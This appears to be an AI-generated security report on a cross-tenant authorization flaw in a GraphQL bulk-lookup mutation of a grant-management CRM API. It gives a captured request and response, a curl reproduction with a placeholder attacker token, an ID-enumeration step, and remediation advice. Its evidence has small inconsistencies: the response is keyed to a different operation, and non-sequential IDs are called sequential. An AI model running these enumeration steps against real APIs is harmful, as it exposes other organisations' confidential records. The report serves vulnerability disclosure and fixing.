# Security Analysis Report
**System:** GrantFlow CRM API (Non-Profit / Grant Management)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0227 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.8 | Sequential ID enumeration via `bulkResourceLookup` — cross-tenant grant data exposed |

---

## Finding 1 — Cross-Tenant Bulk Enumeration via Predictable Sequential IDs (CRITICAL)

### Summary
The `bulkResourceLookup` mutation on GrantFlow CRM API (`api.grantflow-crm-api.example.com`) accepts an arbitrary list of resource IDs with no per-ID ownership validation. Per §4.0 RISK-GQL-227, the resolver does not verify that each returned object's `tenantId` matches the JWT `tenantId`. An attacker authenticated as `tenant-ef58` submitted predictable sequential IDs `["R-2227", "R-1227", "R-3227"]` and obtained confidential grant management data belonging to `tenant-59c7`.

**Pattern:** 1.8 — Predictable or sequential IDs (BOLA)
**Affected resolver:** `bulkResourceLookup(ids: [ID!]!): [Resource!]`
**Affected endpoint:** `POST https://api.grantflow-crm-api.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-ef58`):**
```
POST https://api.grantflow-crm-api.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-ef58
Content-Type: application/json

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2227\", \"R-1227\", \"R-3227\"]) { resourceId tenantId data { sensitiveField } } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-59c7",
      "ownerId": "other-user-ef5859c7",
      "data": {
        "sensitiveField": "CONFIDENTIAL-ef5859c7",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-ef5859c7`
**Timestamp:** `2026-04-13T16:22:37.224617+00:00`

The IDs are numeric-sequential (1227, 2227, 3227), demonstrating that an attacker can enumerate the entire grant record space by iterating ID sequences. The response confirms cross-tenant data access with `sensitiveField: "CONFIDENTIAL-ef5859c7"`.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-227 | Resolver gap | No per-ID `tenantId` check | Architectural root cause |
| §5.0 Pattern 1.8 | Vulnerability | Predictable sequential IDs | Enables systematic enumeration |
| HAR request | `ids` | `["R-2227","R-1227","R-3227"]` | Sequential IDs from victim tenant |
| HAR request | `x-tenant-id` | `tenant-ef58` | Authenticated attacker tenant |
| HAR response | `tenantId` | `tenant-59c7` | Victim tenant — boundary crossed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-ef5859c7` | Confidential grant data exposed |
| HAR response | `ownerId` | `other-user-ef5859c7` | Victim user ownership confirmed |
| HAR headers | `x-request-id` | `req-ef5859c7` | Correlation ID for forensics |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-ef58):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Issue sequential bulk lookup (VULNERABLE):**
```bash
curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-ef58" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { bulkResourceLookup(ids: [\"R-2227\", \"R-1227\", \"R-3227\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.bulkResourceLookup'
# Expected VULNERABLE output: tenant-59c7 records with CONFIDENTIAL-ef5859c7
```

**Step 3 — Scale enumeration:**
```bash
# Attacker iterates: R-0001 through R-9999 in single bulk call
# Each response leaks sensitiveField for any matching grant record
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Returns only records where resource.tenantId === JWT tenantId
# Cross-tenant IDs silently excluded or return FORBIDDEN per-item
```

### Remediation

1. **Per-ID ownership filtering in `bulkResourceLookup`:** For each returned object, verify `resource.tenantId === context.auth.tenantId`. Exclude or error out cross-tenant entries:
   ```javascript
   const resources = await db.resources.findManyByIds(ids);
   return resources.filter(r => r.tenantId === context.auth.tenantId);
   ```
2. **Non-guessable IDs:** Replace sequential numeric IDs (`R-1227`, `R-2227`, `R-3227`) with UUIDs (`R-8f3d-4b2a-...`) to eliminate enumeration vectors. Apply to all new records.
3. **Rate limiting on bulk endpoints:** Limit `bulkResourceLookup` to ≤50 IDs per request and apply per-tenant rate throttling to detect enumeration attempts.
4. **Fix Redis cache key:** Add `tenantId` to cache key: `${tenantId}:${resourceId}` (§2.0 notes cache keyed by `resourceId` only).
5. **PostgreSQL RLS:** Enforce `WHERE tenant_id = current_setting('app.current_tenant')` at DB level as defence-in-depth.
